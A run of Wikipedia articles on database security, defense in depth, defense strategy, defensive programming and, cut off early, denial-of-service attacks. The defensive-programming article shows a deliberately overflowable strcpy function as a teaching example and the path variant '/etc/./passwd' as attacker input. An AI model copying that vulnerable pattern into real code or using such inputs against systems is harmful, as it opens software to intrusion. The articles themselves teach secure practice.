Many organizations develop their own "baseline" security standards and designs detailing basic security control measures for their database systems. These may reflect general information security requirements or obligations imposed by corporate information security policies and applicable laws and regulations (e.g. concerning privacy, financial management and reporting systems), along with generally accepted good database security practices (such as appropriate hardening of the underlying systems) and perhaps security recommendations from the relevant database system and software vendors. The security designs for specific database systems typically specify further security administration and management functions (such as administration and reporting of user access rights, log management and analysis, database replication/synchronization and backups) along with various business-driven information security controls within the database programs and functions (e.g. data entry validation and 
audit trails
). Furthermore, various security-related activities (manual controls) are normally incorporated into the procedures, guidelines etc. relating to the design, development, configuration, use, management and maintenance of databases.





Privileges
[
edit
]


Two types of privileges are important relating to database security within the database environment: system privileges and object privileges.



System privileges
[
edit
]


System privileges allow a local user to perform administrative actions in a database.



Object privileges
[
edit
]


Object privileges allow for the use of certain operations on database objects as authorized by another user. Examples include: usage, select, insert, update, and references.
[
3
]




Principal of least privilege
[
edit
]


Databases that fall under internal controls (that is, data used for public reporting, annual reports, etc.) are subject to the separation of duties, meaning there must be segregation of tasks between development, and production. Each task has to be validated (via code walk-through/fresh eyes) by a third person who is not writing the actual code. The database developer should not be able to execute anything in production without an independent review of the documentation/code for the work that is being performed. Typically, the role of the developer is to pass code to a DBA; however, given the cutbacks that have resulted from the economic downturn, a DBA might not be readily available. If a DBA is not involved, it is important, at minimum, for a peer to conduct a code review. This ensures that the role of the developer is clearly separate.
[
citation needed
]


Another point of internal control is adherence to the principle of providing the least amount of privileges, especially in production. To allow developers more access to get their work done, it is much safer to use impersonation for exceptions that require elevated privileges (e.g. 
EXECUTE AS
 or sudo to do that temporarily). Often developers may dismiss this as “overhead” while on their path to coding glory. Please be aware, however, that DBAs must do all that is considered responsible because they are the 
de facto
 data stewards of the organization and must comply with regulations and the law.
[
4
]




Vulnerability assessments to manage risk and compliance
[
edit
]


Further information: 
application security


One technique for evaluating database security involves performing vulnerability assessments or penetration tests against the database. Testers attempt to find 
security vulnerabilities
 that could be used to defeat or bypass security controls, break into the database, compromise the system etc. 
Database administrators
 or 
information security
 administrators may for example use automated vulnerability scans to search out misconfiguration of controls (often referred to as 'drift') within the layers mentioned above along with known vulnerabilities within the database software. The results of such scans are used to harden the database (improve security) and close off the specific vulnerabilities identified, but other vulnerabilities often remain unrecognized and unaddressed.

In database environments where security is critical, continual monitoring for compliance with standards improves security. Security compliance requires, amongst other procedures, 
patch
 management and the review and management of permissions (especially public) granted to objects within the database. 
Database
 objects may include 
table
 or other objects listed in the Table link. The permissions granted for 
SQL
 language commands on objects are considered in this process. Compliance monitoring is similar to vulnerability assessment, except that the results of vulnerability assessments generally drive the security standards that lead to the continuous monitoring program. Essentially, vulnerability assessment is a preliminary procedure to determine risk where a compliance program is the process of on-going risk assessment.

The compliance program should take into consideration any dependencies at the 
application software
 level as changes at the database level may have effects on the application software or the 
application server
.



Abstraction
[
edit
]


Application level 
authentication
 and 
authorization
 mechanisms may be effective means of providing abstraction from the database layer. The primary benefit of abstraction is that of a 
single sign-on
 capability across multiple databases and platforms. A single sign-on system stores the database user's credentials and authenticates to the database on behalf of the user. Abstraction is the idea of making complex ideas easier to understand. 



Database activity monitoring (DAM)
[
edit
]


Another security layer of a more sophisticated nature includes real-time 
database activity monitoring
, either by analyzing protocol traffic (SQL) over the network, or by observing local database activity on each server using software agents, or both. Use of agents or native logging is required to capture activities executed on the database server, which typically include the activities of the database administrator. Agents allow this information to be captured in a fashion that can not be disabled by the database administrator, who has the ability to disable or modify native audit logs.

Analysis can be performed to identify known exploits or policy breaches, or baselines can be captured over time to build a normal pattern used for detection of anomalous activity that could be indicative of intrusion. These systems can provide a comprehensive database audit trail in addition to the intrusion detection mechanisms, and some systems can also provide protection by terminating user sessions and/or quarantining users demonstrating suspicious behavior. Some systems are designed to support separation of duties (SOD), which is a typical requirement of auditors. SOD requires that the database administrators who are typically monitored as part of the DAM, not be able to disable or alter the DAM functionality. This requires the DAM audit trail to be securely stored in a separate system not administered by the database administration group.



Native audit
[
edit
]


In addition to using external tools for monitoring or auditing, native 
database audit
 capabilities are also available for many database platforms. The native audit trails are extracted on a regular basis and transferred to a designated security system where the database administrators do/should not have access. This ensures a certain level of segregation of duties that may provide evidence the native audit trails were not modified by authenticated administrators, and should be conducted by a security-oriented senior DBA group with read rights into production. Turning on native impacts the performance of the server. Generally, the native audit trails of databases do not provide sufficient controls to enforce separation of duties; therefore, the network and/or kernel module level host based monitoring capabilities provides a higher degree of confidence for forensics and preservation of evidence.



Process and procedures
[
edit
]


A good database security program includes the regular review of privileges granted to user accounts and accounts used by immediate processes. For individual accounts a 
two-factor authentication
 system improves security but adds complexity and cost. Accounts used by automated processes require appropriate controls around password storage such as sufficient encryption and access controls to reduce the risk of compromise.

In conjunction with a sound database security program, an appropriate 
disaster recovery
 program can ensure that service is not interrupted during a security incident, or any incident that results in an outage of the primary database environment. An example is that of 
replication
 for the primary databases to sites located in different geographical regions.
[
5
]


After an incident occurs, 
database forensics
 can be employed to determine the scope of the breach, and to identify appropriate changes to systems and processes.



See also
[
edit
]


Negative database


Database firewall


FIPS 140-2
 US federal standard for authenticating a cryptography module


Virtual private database


References
[
edit
]






^
 
"What is database security?"
. 
IBM
. Retrieved 
21 January
 2024
.




^
 
Porter, H.; Hirsch, A. (10 August 2009). 
"Nine sacked for breaching core ID card database"
. 
The Guardian
. Retrieved 
21 January
 2024
.




^
 
Stephens, Ryan (2011). 
Sams teach yourself SQL in 24 hours
. Indianapolis, Ind: Sams. 
ISBN
 
9780672335419
.




^
 
"Database Security Best Practices"
. 
technet.microsoft.com
. Archived from 
the original
 on 2016-09-15
. Retrieved 
2016-09-02
.




^
 
Seema Kedar (2007). 
Database Management Systems
. Technical Publications. p. 15. 
ISBN
 
978-81-8431-584-4
. Retrieved 
21 January
 2024
.






Further reading
[
edit
]


"Security Technical Implementation Guides"
. The DoD Cyber Exchange. 2021.
 The 2021 
Defense Information Systems Agency
 technical implementation guides.


v
t
e
Database
Main


Requirements


Theory


Models


Database management system


Machine


Engine


Server


Application


Connection


datasource


DSN


Administrator


Lock


Types


Tools


Languages


Data definition


Data manipulation


Query


information retrieval


Security


Activity monitoring


Audit


Forensics


Negative database


Design


Entities and relationships
 (and 
Enhanced
 notation)


Normalization


Schema


Refactoring


Cardinality


Programming


Abstraction layer


Object–relational mapping


Management


Virtualization


Tuning


caching


Migration


Preservation


Integrity


Lists of


Academic


Biological


Biodiversity


Facial expression


Online


Online music


Online real estate


See also


Database-centric architecture


Intelligent database


Two-phase locking


Locks with ordered sharing


Load file


Publishing


Halloween Problem


Log shipping


 
WikiProject
 
 
Category










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Database_security&oldid=1239219191
"


Category
: 
Database security
Hidden categories: 
Articles needing additional references from January 2024
All articles needing additional references
All articles with unsourced statements
Articles with unsourced statements from November 2021











From Wikipedia, the free encyclopedia






Concept in information security


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Defense in depth" computing
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
April 2012
)
 (
Learn how and when to remove this message
)


Defense in depth
 is a concept used in 
information security
 in which multiple layers of security controls (defense) are placed throughout an 
information technology
 (IT) system. Its intent is to provide 
redundancy
 in the event a 
security control
 fails or a vulnerability is exploited that can cover aspects of 
personnel
, 
procedural
, 
technical
 and 
physical
 security for the duration of the system's life cycle.





Background
[
edit
]


The idea behind the defense in depth approach is to defend a system against any particular attack using several independent methods.
[
1
]
 It is a layering tactic, conceived
[
2
]
 by the 
National Security Agency
 (NSA) as a comprehensive approach to information and electronic security.
[
3
]
[
4
]
 The term defense in depth in computing is inspired by a military 
strategy
 of 
the same name
, but is quite different in concept. The military strategy revolves around having a weaker perimeter defense and intentionally yielding space to buy time, envelop, and ultimately counter-attack an opponent, whereas the information security strategy simply involves multiple layers of controls, but not intentionally ceding ground (
cf.
 
honeypot.
)



Controls
[
edit
]


Defense in depth can be divided into three areas: Physical, Technical, and Administrative.
[
5
]




Physical
[
edit
]


Physical controls
[
3
]
 are anything that physically limits or prevents access to IT systems. Fences, guards, dogs, and CCTV systems and the like.



Technical
[
edit
]


Technical controls are hardware or software whose purpose is to protect systems and resources. Examples of technical controls would be disk encryption, File integrity software, and authentication. Hardware technical controls differ from physical controls in that they prevent access to the contents of a system, but not the physical systems themselves.



Administrative
[
edit
]


Administrative controls are organization's policies and procedures. Their purpose is to ensure that there is proper guidance available in regard to security and that regulations are met. They include things such as hiring practices, data handling procedures, and security requirements.



Methods
[
edit
]


Using more than one of the following layers constitutes an example of defense in depth.



System and application
[
edit
]


Antivirus software


Authentication
 and 
password
 security


Encryption


Hashing
 passwords


Logging
 and auditing


Multi-factor authentication


Vulnerability scanners


Timed access control


Internet Security Awareness Training


Sandboxing


Intrusion detection systems
 (IDS)


Network
[
edit
]


Firewalls
 (hardware or software)


Demilitarized zones
 (DMZ)


Virtual private network
 (VPN)


Physical
[
edit
]


Biometrics


Data-centric security


Physical security
 (e.g. 
deadbolt
 locks)


Example
[
edit
]


In the following scenario a web browser is developed using defense in depth -



the browser developers receive security training


the codebase is checked automatically using security analysis tools


the browser is regularly audited by an internal security team


... is occasionally audited by an external security team


... is executed inside a sandbox


See also
[
edit
]


Defence-in-depth (Roman military)


Defense strategy (computing)


References
[
edit
]






^
 
Schneier on Security: Security in the Cloud




^
 
"Some principles of secure design. Designing Secure Systems module Autumn PDF Free Download"
. 
docplayer.net
. Retrieved 
2020-12-12
.




^ 
a
 
b
 
Defense in Depth: A practical strategy for achieving Information Assurance in today’s highly networked environments.




^
 
OWASP CheatSheet: Defense in depth




^
 
Stewart, James Michael; Chapple, Mike; Gibson, Darril (2015). 
CISSP (ISC)2 Certified Information Systems Security Professional Official Study Guide
.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Defense_in_depth_(computing)&oldid=1187358319
"


Categories
: 
Computer network security
Computer security procedures
Data security
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing additional references from April 2012
All articles needing additional references











From Wikipedia, the free encyclopedia






Concept to reduce computer security risks


In computing, 
defense strategy
 is a concept and practice used by computer designers, users, and IT personnel to reduce 
computer security
 risks.
[
1
]






Common strategies
[
edit
]


Boundary protection
[
edit
]


Boundary protection employs security measures and devices to prevent unauthorized access to computer systems (referred to as controlling the system border). The approach is based on the assumption that the attacker did not penetrate the system. Examples of this strategy include using 
gateways
, 
routers
, 
firewalls
, and 
password
 checks, deleting suspicious emails/messages, and limiting physical access.

Boundary protection is typically the main strategy for computing systems; if this type of defense is successful, no other strategies are required. This is a resource-consuming strategy with a known scope. External information system monitoring is part of boundary protection.
[
2
]




Information System Monitoring
[
edit
]


Information System Monitoring employs security measures to find intruders or the damage done by them. This strategy is used when the system has been penetrated, but the intruder did not gain full control. Examples of this strategy include 
antivirus software
, applying a 
patch
, and 
network behavior anomaly detection
.

This strategy's success is based on competition of offence and defence. This is a time and resource-consuming strategy, affecting performance. The scope is variable in time. It cannot be fully successful if not supported by other strategies.



Unavoidable actions
[
edit
]


Unavoidable actions employ security measures that cannot be prevented or neutralized. This strategy is based on the assumption that the system has been penetrated, but an intruder cannot prevent the defensive mechanism from being employed. Examples of this strategy include 
rebooting
, using 
physical unclonable functions
, and using a 
security switch
.



Secure enclave
[
edit
]


Secure enclave is a strategy that employs security measures that prevent access to some parts of the system. This strategy is used when the system has been penetrated, but an intruder cannot access its special parts. Examples of this strategy include using the 
Access level
, using a 
Trusted Platform Module
, using a 
microkernel
, using Diode (unidirectional network device), and using 
air gaps
.

This is a supporting strategy for boundary protection, information system monitoring and unavoidable action strategies. This is a time and resource-consuming strategy with a known scope. Even if this strategy is fully successful, it does not guarantee the overall success of the larger defense strategy.



False target
[
edit
]


False target is a strategy that deploys non-real targets for an intruder. It is used when the system has been penetrated, but the intruder does not know the system architecture. Examples of this strategy include 
honeypots
, 
virtual computers
, 
virtual security switches
, fake files, and address/password copies.

This is a supporting strategy for information system monitoring. It is a time-consuming strategy, and the scope is determined by the designer. It cannot be fully successful if not supported by other strategies.



Moving target
[
edit
]


Moving target is a security strategy based on frequent changes of data and processes. This strategy is based on the assumption that the system has been penetrated, but the intruder does not know the architecture of the system and its processes. Examples of this strategy are regular changes of 
passwords
 or 
keys (cryptography)
, using a dynamic platform, etc.

This is a supporting strategy for information system monitoring. It is a time-consuming strategy, and the scope is determined by the designer. It cannot be fully successful if not supported by other strategies. Actions are activated on a scheduled basis or as a response to a detected threat.



Useless information
[
edit
]


Useless information comprises  security measures to turn important information into useless data for an intruder. The strategy is based on the assumption that the system has been penetrated, but the intruder is not able to decrypt information, or does not have enough time to decrypt it. For example, 
encrypting the file system
 or using 
encryption software
 can render the data useless even if an attacker gets access to the file system, or using 
data masking
, where sensitive data is hidden in non-sensitive data with modified content.

This is a supporting strategy for information system monitoring. It is a time and resource-consuming strategy, affecting performance. The scope is known. It cannot be successful if not supported by other strategies. 
Claude Shannon's
 theorems show that if the encryption key is smaller than the secured information, the 
information-theoretic security
 can not be achieved. There is only one known unbreakable cryptographic system: the 
one-time pad
. This strategy is not generally possible to use because of the difficulties involved in exchanging one-time pads without the risk of being compromised. Other cryptographic systems are only buying time or can be broken (see 
Cryptographic hash function#Degree_of_difficulty
). This strategy needs to be supported by the moving target or deletes strategies.



Deletion
[
edit
]


Deletion is a strategy using  security measures to prevent an intruder from gaining sensitive information at all costs. The strategy is based on the assumption that the damage from information disclosure would be greater than the damage caused by deleting the information or disabling the system required to gain access to the information. The strategy is part of the 
data-centric security
 approach. Examples of this strategy include information deletion as a response to a security violation (such as unauthorized access attempts) and 
password
 resets.

This is a supporting strategy for information system monitoring. It is a resource-consuming strategy, and the scope is determined by the designer. It cannot be fully successful on its own since the detected intrusion is not quarantined.



Information redundancy
[
edit
]


Information redundancy is a strategy performing security measures to keep redundancy for information and using it in case of damage. The strategy is based on the assumption that finding and repairing the damage is more complicated than the restoration of the system. Examples of this strategy include using system restoration, keeping backup files,  and using a backup computer.

This is a supporting strategy for information system monitoring. This strategy consumes considerable resources, and the scope is known. It can be fully successful in its part.



Limiting of actions made by a robot
[
edit
]


Limiting of actions made by a robot is a strategy performing security measures to limit a robot's (software bot) actions. The strategy is based on the assumption that a robot can take more actions, or create damage that a human cannot create. Examples of this strategy include using 
anti-spam techniques
, using 
CAPTCHA
 and other 
human presence detection
 techniques, and using 
DOS
-based defense (protection from 
Denial-of-service attack
).

This is a supporting strategy for boundary protection and information system monitoring. It is a time and resource-consuming strategy, and the scope is determined by the designer. This strategy cannot be fully successful on its own.



Active defense
[
edit
]


Active defense
 is a strategy performing security measures attacking the potential intruders. The strategy is based on the assumption that a potential intruder under attack has fewer abilities. Examples of this strategy include creating and using lists of trusted networks, devices, and applications, blocking untrusted addresses, and vendor management.

This is a supporting strategy for boundary protection and information system monitoring. It is a time and resource-consuming strategy, and the scope is determined by the designer. This strategy cannot be fully successful on its own.



Unavoidable actions
[
edit
]


This strategy can support any other strategy.
[
3
]
[
4
]
[
5
]
[
6
]
[
clarification needed
]
 This is a resource-consuming strategy, and the scope is determined by the designer. An implementation may have a wide impact on devices.
[
7
]
 This strategy can be fully successful, but in most cases, there is a trade-off of full system functionality for security. This strategy can be used 
proactively
 or reactively. Actions done in response to an already detected problem may be too late.
[
8
]
 Any implementation needs to be supported by the secure enclave strategy in order to prevent neutralizing action by unauthorized access to the protection mechanism.

Actions can be of the following types: 



Preventive actions – blocking certain functions, signals, peripheral devices, memory parts, and/or data transfers. For example: blocking audio/video recording, the sending of long messages, or secret memory access.


Creative actions – activating certain functions, sending signals, messages, and/or data. For example: sending an alarm signal or message, or activating data copying or transfer.


Modification actions – modifying a peripheral device's functioning, or modifying the data, signals or processes of the defended system. For example, independent hardware encryption/decryption, changing accelerometer accuracy, filtering messages or words, or changing 
state diagram
 or 
algorithm
 by independent hardware.


See also
[
edit
]


Strong cryptography


References
[
edit
]






^
 
Martiny, Karsten; Motzek, Alexander; Möller, Ralf (2015). 
Formalizing Agents' Beliefs for Cyber-Security Defense Strategy Planning
 
(PDF)
. Advances in Intelligent Systems and Computing. Vol. 369. pp. 15–25. 
doi
:
10.1007/978-3-319-19713-5_2
. 
ISBN
 
978-3-319-19712-8
. 
S2CID
 
18198176
.




^
 
Computer Security Division, Information Technology Laboratory (November 30, 2016). 
"Release Search - NIST Risk Management Framework | CSRC | CSRC"
. 
CSRC | NIST
.




^
 
"What is two-factor authentication, and which 2FA solutions are best?"
. 
PCWorld
. June 5, 2019.




^
 
"PUF based encryption"
. 
www.researchgate.net
.




^
 
"Design and implementation of Hardware-assisted security architecture for software integrity monitoring"
. 
hal.archives-ouvertes.fr
.




^
 
"Real-time Captcha technique improves biometric authentication"
. 
ScienceDaily
.




^
 
"Adding kill switches to protect your privacy is not as simple as you might think"
. 
amosbbatto.wordpress.com
. August 15, 2019.




^
 
Gitlin, Jonathan M. (October 18, 2019). 
"Should all connected cars have a physical network kill switch?"
. 
Ars Technica
.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Defense_strategy_(computing)&oldid=1221651397
"


Category
: 
Computer security
Hidden categories: 
Articles with short description
Short description matches Wikidata
Wikipedia articles needing clarification from December 2019











From Wikipedia, the free encyclopedia






Software development methodology






This article 
contains 
instructions, advice, or how-to content
.
 Please help 
rewrite the content
 so that it is more encyclopedic or 
move
 it to 
Wikiversity
, 
Wikibooks
, or 
Wikivoyage
.
 
(
March 2012
)


Defensive programming
 is a form of 
defensive design
 intended to develop programs that are capable of detecting potential security abnormalities and make predetermined responses.
[
1
]
 It ensures the continuing function of a piece of 
software
 under unforeseen circumstances. Defensive programming practices are often used where 
high availability
, 
safety
, or 
security
 is needed.

Defensive programming is an approach to improve software and 
source code
, in terms of:



General quality – reducing the number of 
software bugs
 and problems.


Making the source code comprehensible – the source code should be readable and understandable so it is approved in a 
code audit
.


Making the software behave in a predictable manner despite unexpected inputs or user actions.


Overly defensive programming, however, may safeguard against errors that will never be encountered, thus incurring run-time and maintenance costs.





Secure programming
[
edit
]


Main article: 
Secure coding


Secure programming is the subset of defensive programming concerned with 
computer security
. Security is the concern, not necessarily safety or availability (the 
software
 may be allowed to fail in certain ways). As with all kinds of defensive programming, avoiding bugs is a primary objective; however, the motivation is not as much to reduce the likelihood of failure in normal operation (as if safety were the concern), but to reduce the attack surface – the programmer must assume that the software might be misused actively to reveal bugs, and that bugs could be exploited maliciously.



int
 
risky_programming
(
char
 
*
input
)
 
{


  
char
 
str
[
1000
];
 


  


  
// ...


  


  
strcpy
(
str
,
 
input
);
  
// Copy input.


  


  
// ...


}




The function will result in undefined behavior when the input is over 1000 characters. Some programmers may not feel that this is a problem, supposing that no user will enter such a long input. This particular bug demonstrates a vulnerability which enables 
buffer overflow
 
exploits
. Here is a solution to this example:



int
 
secure_programming
(
char
 
*
input
)
 
{


  
char
 
str
[
1000
+
1
];
  
// One more for the null character.



  
// ...



  
// Copy input without exceeding the length of the destination.


  
strncpy
(
str
,
 
input
,
 
sizeof
(
str
));



  
// If strlen(input) >= sizeof(str) then strncpy won't null terminate. 


  
// We counter this by always setting the last character in the buffer to NUL,


  
// effectively cropping the string to the maximum length we can handle.


  
// One can also decide to explicitly abort the program if strlen(input) is 


  
// too long.


  
str
[
sizeof
(
str
)
 
-
 
1
]
 
=
 
'\0'
;



  
// ...


}




Offensive programming
[
edit
]


Main article: 
Offensive programming


Offensive programming is a category of defensive programming, with the added emphasis that certain errors should 
not
 be 
handled defensively
. In this practice, only errors from outside the program's control are to be handled (such as user input); the software itself, as well as data from within the program's line of defense, are to be trusted in this 
methodology
.



Trusting internal data validity
[
edit
]


Overly defensive programming


const
 
char
*
 
trafficlight_colorname
(
enum
 
traffic_light_color
 
c
)
 
{


    
switch
 
(
c
)
 
{


        
case
 
TRAFFICLIGHT_RED
:
    
return
 
"red"
;


        
case
 
TRAFFICLIGHT_YELLOW
:
 
return
 
"yellow"
;


        
case
 
TRAFFICLIGHT_GREEN
:
  
return
 
"green"
;


    
}


    
return
 
"black"
;
 
// To be handled as a dead traffic light.


    
// Warning: This last 'return' statement will be dropped by an optimizing


    
// compiler if all possible values of 'traffic_light_color' are listed in


    
// the previous 'switch' statement...


}




Offensive programming


const
 
char
*
 
trafficlight_colorname
(
enum
 
traffic_light_color
 
c
)
 
{


    
switch
 
(
c
)
 
{


        
case
 
TRAFFICLIGHT_RED
:
    
return
 
"red"
;


        
case
 
TRAFFICLIGHT_YELLOW
:
 
return
 
"yellow"
;


        
case
 
TRAFFICLIGHT_GREEN
:
  
return
 
"green"
;


    
}


    
assert
(
0
);
 
// Assert that this section is unreachable.


    
// Warning: This 'assert' function call will be dropped by an optimizing


    
// compiler if all possible values of 'traffic_light_color' are listed in


    
// the previous 'switch' statement...


}




Trusting software components
[
edit
]


Overly defensive programming


if
 
(
is_legacy_compatible
(
user_config
))
 
{


    
// Strategy: Don't trust that the new code behaves the same


    
old_code
(
user_config
);


}
 
else
 
{


    
// Fallback: Don't trust that the new code handles the same cases


    
if
 
(
new_code
(
user_config
)
 
!=
 
OK
)
 
{


        
old_code
(
user_config
);


    
}


}




Offensive programming


// Expect that the new code has no new bugs


if
 
(
new_code
(
user_config
)
 
!=
 
OK
)
 
{


    
// Loudly report and abruptly terminate program to get proper attention


    
report_error
(
"Something went very wrong"
);


    
exit
(
-1
);


}




Techniques
[
edit
]


Here are some defensive programming techniques:



Intelligent source code reuse
[
edit
]


If existing code is tested and known to work, reusing it may reduce the chance of bugs being introduced.

However, reusing code is not 
always
 good practice. Reuse of existing code, especially when widely distributed, can allow for exploits to be created that target a wider audience than would otherwise be possible and brings with it all the security and vulnerabilities of the reused code.

When considering using existing source code, a quick review of the modules(sub-sections such as classes or functions) will help eliminate or make the developer aware of any potential vulnerabilities and ensure it is suitable to use in the project. 
[
citation needed
]




Legacy problems
[
edit
]


Before reusing old source code, libraries, APIs, configurations and so forth, it must be considered if the old work is valid for reuse, or if it is likely to be prone to 
legacy
 problems.

Legacy problems are problems inherent when old designs are expected to work with today's requirements, especially when the old designs were not developed or tested with those requirements in mind.

Many software products have experienced problems with old legacy source code; for example:



Legacy code
 may not have been designed under a defensive programming initiative, and might therefore be of much lower quality than newly designed source code.


Legacy code may have been written and tested under conditions which no longer apply. The old quality assurance tests may have no validity any more.

Example 1
: legacy code may have been designed for ASCII input but now the input is UTF-8.


Example 2
: legacy code may have been compiled and tested on 32-bit architectures, but when compiled on 64-bit architectures, new arithmetic problems may occur (e.g., invalid signedness tests, invalid type casts, etc.).


Example 3
: legacy code may have been targeted for offline machines, but becomes vulnerable once network connectivity is added.


Legacy code is not written with new problems in mind. For example, source code written in 1990 is likely to be prone to many 
code injection
 vulnerabilities, because most such problems were not widely understood at that time.


Notable examples of the legacy problem:



BIND 9
, presented by Paul Vixie and David Conrad as "BINDv9 is a 
complete rewrite
", "Security was a key consideration in design",
[
2
]
 naming security, robustness, scalability and new protocols as key concerns for rewriting old legacy code.


Microsoft Windows
 suffered from "the" 
Windows Metafile vulnerability
 and other exploits related to the WMF format. Microsoft Security Response Center describes the WMF-features as 
"Around 1990, WMF support was added... This was a different time in the security landscape... were all completely trusted"
,
[
3
]
 not being developed under the security initiatives at Microsoft.


Oracle
 is combating legacy problems, such as old source code written without addressing concerns of 
SQL injection
 and 
privilege escalation
, resulting in many security vulnerabilities which have taken time to fix and also generated incomplete fixes. This has given rise to heavy criticism from security experts such as 
David Litchfield
, 
Alexander Kornbrust
, 
Cesar Cerrudo
.
[
4
]
[
5
]
[
6
]
 An additional criticism is that default installations (largely a legacy from old versions) are not aligned with their own security recommendations, such as Oracle Database Security Checklist, which is hard to amend as many applications require the less secure legacy settings to function correctly.


Canonicalization
[
edit
]


Malicious users are likely to invent new kinds of representations of incorrect data. For example, if a program attempts to reject accessing the file "/etc/
passwd
", a cracker might pass another variant of this file name, like "/etc/./passwd". 
Canonicalization
 libraries can be employed to avoid bugs due to non-
canonical
 input.



Low tolerance against "potential" bugs
[
edit
]


Assume that code constructs that appear to be problem prone (similar to known vulnerabilities, etc.) are bugs and potential security flaws.  The basic rule of thumb is: "I'm not aware of all types of 
security exploits
.  I must protect against those I 
do
 know of and then I must be proactive!".



Other tips to secure your code
[
edit
]


One of the most common problems is unchecked use of constant-size or pre-allocated structures for dynamic-size data
[
citation needed
]
 such as inputs to the program (the 
buffer overflow
 problem). This is especially common for 
string
 data in 
C
[
citation needed
]
. C library functions like 
gets
 should never be used since the maximum size of the input buffer is not passed as an argument. C library functions like 
scanf
 can be used safely, but require the programmer to take care with the selection of safe format strings, by sanitizing it before using it.


Encrypt/authenticate all important data transmitted over networks.  Do not attempt to implement your own encryption scheme, use a 
proven one
 instead. Message checking with 
CRC
 or similar technology will also help secure data sent over a network.


The three rules of data security
[
edit
]


All 
data
 is important until proven otherwise.


All data is tainted until proven otherwise.


All code is insecure until proven otherwise.

You cannot prove the security of any code in 
userland
, or, more commonly known as: 
"never trust the client"
.


These three rules about data security describe how to handle any data, internally or externally sourced:

All data is important until proven otherwise
 - means that all data must be verified as garbage before being destroyed.

All data is tainted until proven otherwise
   - means that all data must be handled in a way that does not expose the rest of the runtime environment without verifying integrity.

All code is insecure until proven otherwise
  - while a slight misnomer, does a good job reminding us to never assume our code is secure as bugs or 
undefined behavior
 may expose the project or system to attacks such as common 
SQL injection
 attacks.



More Information
[
edit
]


If data is to be checked for correctness, verify that it is correct, not that it is incorrect.


Design by contract


Assertions
 (also called 
assertive programming
)


Prefer 
exceptions
 to return codes

Generally speaking, it is preferable
[
according to whom?
]
 to throw exception messages that enforce part of your 
API
 
contract
 and guide the developer instead of returning error code values that do not point to where the exception occurred or what the program stack looked liked, Better logging and exception handling will increase robustness and security of your software
[
citation needed
]
, while minimizing developer stress
[
citation needed
]
.


See also
[
edit
]


Computer security


References
[
edit
]




^
 
Boulanger, Jean-Louis (2016-01-01), Boulanger, Jean-Louis (ed.), 
"6 - Technique to Manage Software Safety"
, 
Certifiable Software Applications 1
, Elsevier, pp. 125–156, 
ISBN
 
978-1-78548-117-8
, retrieved 
2022-09-02




^
 
"fogo archive: Paul Vixie and David Conrad on BINDv9 and Internet Security by Gerald Oskoboiny <gerald@impressive.net>"
. 
impressive.net
. Retrieved 
2018-10-27
.




^
 
"Looking at the WMF issue, how did it get there?"
. 
MSRC
. Archived from 
the original
 on 2006-03-24
. Retrieved 
2018-10-27
.




^
 
Litchfield, David. 
"Bugtraq: Oracle, where are the patches???"
. 
seclists.org
. Retrieved 
2018-10-27
.




^
 
Alexander, Kornbrust. 
"Bugtraq: RE: Oracle, where are the patches???"
. 
seclists.org
. Retrieved 
2018-10-27
.




^
 
Cerrudo, Cesar. 
"Bugtraq: Re: [Full-disclosure] RE: Oracle, where are the patches???"
. 
seclists.org
. Retrieved 
2018-10-27
.






External links
[
edit
]


CERT Secure Coding Standards










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Defensive_programming&oldid=1189609370
"


Categories
: 
Programming paradigms
Programming principles
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Use American English from November 2020
All Wikipedia articles written in American English
Articles needing cleanup from March 2012
All pages needing cleanup
Articles containing how-to sections
All articles with unsourced statements
Articles with unsourced statements from November 2021
Articles with unsourced statements from December 2023
All articles with specifically marked weasel-worded phrases
Articles with specifically marked weasel-worded phrases from December 2023











From Wikipedia, the free encyclopedia






Type of cyber-attack


"DoS" redirects here. For the family of computer operating systems, see 
DOS
. For the United States federal executive department, see 
United States Department of State
. For other uses, see 
DOS (disambiguation)
.


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Denial-of-service attack"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
February 2024
)
 (
Learn how and when to remove this message
)






Diagram of a DDoS attack. Note how multiple computers are attacking a single computer.


In 
computing
, a 
denial-of-service attack
 (
DoS attack
) is a 
cyber-attack
 in which the perpetrator seeks to make a machine or network resource unavailable to its intended 
users
 by temporarily or indefinitely disrupting 
services
 of a 
host
 connected to a 
network
. Denial of service is typically accomplished by 
flooding
 the targeted machine or resource with superfluous requests in an attempt to overload systems and prevent some or all legitimate requests from being fulfilled.
[
1
]
 The range of attacks varies widely, spanning from inundating a server with millions of requests to slow its performance, overwhelming a server with a substantial amount of invalid data, to submitting requests with an illegitimate 
IP address
.
[
2
]


In a 
distributed denial-of-service attack
 (
DDoS attack
), the incoming traffic flooding the victim originates from many different sources. More sophisticated strategies are required to mitigate this type of attack; simply attempting to block a single source is insufficient as there are multiple sources.
[
3
]
  A DoS or DDoS attack is analogous to a group of people crowding the entry door of a shop, making it hard for legitimate customers to enter, thus disrupting trade and losing the business money. Criminal perpetrators of DoS attacks often target sites or services hosted on high-profile 
web servers
 such as 
banks
 or 
credit card
 
payment gateways
. 
Revenge
 and 
blackmail
,
[
4
]
[
5
]
[
6
]
 as well as 
hacktivism
,
[
7
]
 can motivate these attacks.





History
[
edit
]


This section 
needs expansion
. You can help by 
adding to it
.  
(
July 2017
)


Panix
, the third-oldest 
ISP
 in the world, was the target of what is thought to be the first DoS attack. On September 6, 1996, Panix was subject to a 
SYN flood
 attack, which brought down its services for several days while hardware vendors, notably 
Cisco
, figured out a proper defense.
[
8
]
 Another early demonstration of the DoS attack was made by Khan C. Smith in 1997 during a 
DEF CON
 event, disrupting Internet access to the 
Las Vegas Strip
 for over an hour. The release of sample code during the event led to the online attack of 
Sprint
, 
EarthLink
, 
E-Trade
 and other major corporations in the year to follow.
[
9
]
 The largest DDoS attack to date happened in September 2017, when 
Google Cloud
 experienced an attack with a peak volume of 
2.54 Tb/s
